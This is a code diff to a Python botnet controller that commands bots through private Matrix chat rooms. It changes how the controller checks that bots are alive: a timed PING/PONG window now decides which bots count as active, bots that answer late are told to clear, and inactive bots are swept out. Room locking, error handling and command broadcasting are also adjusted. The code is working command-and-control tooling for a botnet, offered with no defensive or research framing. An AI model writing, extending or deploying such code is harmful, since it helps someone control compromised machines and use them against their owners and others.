@@ -7,6 +7,7 @@ from requests.exceptions import MissingSchema
 import os
 import sys
 from dotenv import load_dotenv
+from datetime import datetime
 import json
 from dataclasses import dataclass
 
@@ -53,14 +54,17 @@ class CommandRoom:
         return bot
 
     def remove_bot(self, bot_id):
-        del self.bots[bot_id]
+        try:
+            del self.bots[bot_id]
+        except:
+            print("Tried removing non-existing bot", bot_id)
         
     def set_active(self, bot_id) -> bool:
         """
         return False if bot_id doesnt exist
         """
         if bot_id not in self.bots:
-            print("Not exists")
+            print("Couldn't find active bot")
             return False
         self.bots[bot_id][1] = True
         return True
@@ -70,7 +74,6 @@ class CommandRoom:
             bot[1] = False
     
     def delete_inactive_bots(self):
-        # SCUFFED BECAUSE GIL
         self.bots = {k: bot for k, bot in self.bots.items() if bot[1] == True}
 
     def leave(self) -> bool:
@@ -84,16 +87,16 @@ class BotnetController:
     access_token: str
     announce_room: Room
     command_rooms: dict[str, CommandRoom]
-    command_room_lock: threading.Lock
 
-    recv_pongs = threading.Event
     def __init__(self):
         self.device_id = "BOTCONTROLLER"
         self.pinging = False
         self.client = MatrixClient(MATRIX_HOMESERVER)
         self.command_rooms = {}
         self.command_room_lock = threading.Lock()
-        self.recv_pongs = threading.Event()
+        
+        self.pong_window_end = 0
+        self.pong_window_dur = 20
 
     def login(self):
         # login and sync
@@ -132,12 +135,12 @@ class BotnetController:
     def send_command(self, command: str, room: CommandRoom):
         response = room.send_cmd(f"COMMAND:{command}")
         # TODO: check for successfull response?
-        # print(f"[+] Sent command: {command}")
         
     def send_to_all(self, command: str):
         with self.command_room_lock:
             for _, cmd_room in self.command_rooms.items():
-                self.send_command(command, cmd_room)
+                if len(cmd_room.bots) > 0:
+                    self.send_command(command, cmd_room)
             
     def assign_bot(self, botdata, roomid):
         """
@@ -182,12 +185,17 @@ class BotnetController:
             self.command_room_lock.release()
             
         elif action == "PONG":
-            room_id, bot_id = info.rsplit(":", 1)
-            # if for some reason the bots PONG is received later than or during the SWEEP
-            # tell the bot to just reconnect to the botnet
-            # unlikely but better safe than sorry
-            if not self.recv_pongs.is_set() or self.command_rooms[room_id].set_active(bot_id):
+            room_id, bot_id, pong_origin = info.rsplit(":", 2)
+            pong_origin = float(pong_origin)
+            print("start:", self.pong_window_end - self.pong_window_dur, "origin:", pong_origin, "end:", self.pong_window_end)
+            if not (self.pong_window_end - self.pong_window_dur <= pong_origin <= self.pong_window_end):
+                # pong too late :(
+                print("PONG TOO LATE")
                 self.send_command(f"CLEAR:{bot_id}", self.command_rooms[room_id])
+                return
+            
+            with self.command_room_lock:
+                self.command_rooms[room_id].set_active(bot_id)
             
     def create_room(self, name: str) -> Room:
         room: Room = self.client.create_room(name, is_public=False, invitees=[BOTS_NAME])
@@ -200,20 +208,24 @@ class BotnetController:
             self.command_rooms[new_room.room_id] = CommandRoom(new_room)
 
     def ping_loop(self):
+        time.sleep(5)
         while True:
-            time.sleep(8) # every 8 sec
             # Mark
             with self.command_room_lock:
                 for room in self.command_rooms.values():
                     room.set_all_inactive()
-            self.recv_pongs.set()
+
             self.send_to_all("PING")
-            time.sleep(5) # wait a bit
+            time.sleep(self.pong_window_dur) # give time for pongs to come in
+            self.pong_window_end = time.time()
+            
             # and Sweep
-            self.recv_pongs.clear()
             with self.command_room_lock:
                 for room in self.command_rooms.values():
                     room.delete_inactive_bots()
+                    
+            time.sleep(8)
+                        
 
     def run(self):
         self.login()
